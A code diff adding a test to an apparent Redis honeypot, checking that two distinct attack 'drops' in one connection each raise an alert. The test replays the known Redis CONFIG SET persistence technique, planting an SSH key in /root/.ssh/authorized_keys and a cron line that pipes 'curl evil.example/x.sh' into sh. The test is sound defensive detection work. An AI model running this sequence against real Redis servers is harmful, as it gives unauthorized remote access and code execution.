@@ -339,6 +339,54 @@ async def test_redis_rce_dropper_chain_captured(redis_server):
 
 
 @pytest.mark.asyncio
+async def test_redis_rce_dropper_second_distinct_drop_also_captured(redis_server):
+    """A one-shot 'already reported' flag would silently swallow a second,
+    materially different drop attempt in the same connection — e.g. an
+    attacker who redirects to a cron file after the SSH-key drop already
+    fired. Both must produce their own CRITICAL redis_rce_dropper alert."""
+    from sqlalchemy import select
+
+    from honeypot_mcp.storage import event_buffer
+    from honeypot_mcp.storage.database import get_session
+    from honeypot_mcp.storage.models import Alert
+
+    port = redis_server
+    buf = event_buffer.get_buffer()
+    await buf.start()
+    ssh_key = b"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABattacker@evil\n\n"
+    cron_line = b"\n\n* * * * * curl evil.example/x.sh|sh\n\n"
+    try:
+        reader, writer = await asyncio.open_connection("127.0.0.1", port)
+        try:
+            # First drop: SSH authorized_keys.
+            await _cmd(reader, writer, b"CONFIG", b"SET", b"dir", b"/root/.ssh")
+            await _cmd(reader, writer, b"CONFIG", b"SET", b"dbfilename", b"authorized_keys")
+            await _cmd(reader, writer, b"SET", b"crackit", ssh_key)
+            assert await _cmd(reader, writer, b"SAVE") == b"+OK\r\n"
+            # Second, distinct drop in the SAME connection: different target,
+            # different planted key.
+            await _cmd(reader, writer, b"CONFIG", b"SET", b"dir", b"/etc/cron.d")
+            await _cmd(reader, writer, b"CONFIG", b"SET", b"dbfilename", b"evil")
+            await _cmd(reader, writer, b"SET", b"payload", cron_line)
+            assert await _cmd(reader, writer, b"SAVE") == b"+OK\r\n"
+        finally:
+            writer.close()
+            with contextlib.suppress(Exception):
+                await writer.wait_closed()
+        await asyncio.sleep(1.2)
+    finally:
+        await buf.stop()
+
+    async with get_session() as session:
+        result = await session.execute(select(Alert).where(Alert.event_type == "redis_rce_dropper"))
+        events = list(result.scalars().all())
+
+    assert len(events) == 2, "the second, distinct drop attempt must not be swallowed"
+    target_paths = {e.payload["target_path"] for e in events}
+    assert target_paths == {"/root/.ssh/authorized_keys", "/etc/cron.d/evil"}
+
+
+@pytest.mark.asyncio
 async def test_redis_keyspace_bounded(redis_server):
     """The keyspace is capped so it can't be used to exhaust honeypot memory."""
     from honeypot_mcp.engines.redis import _MAX_KEYS
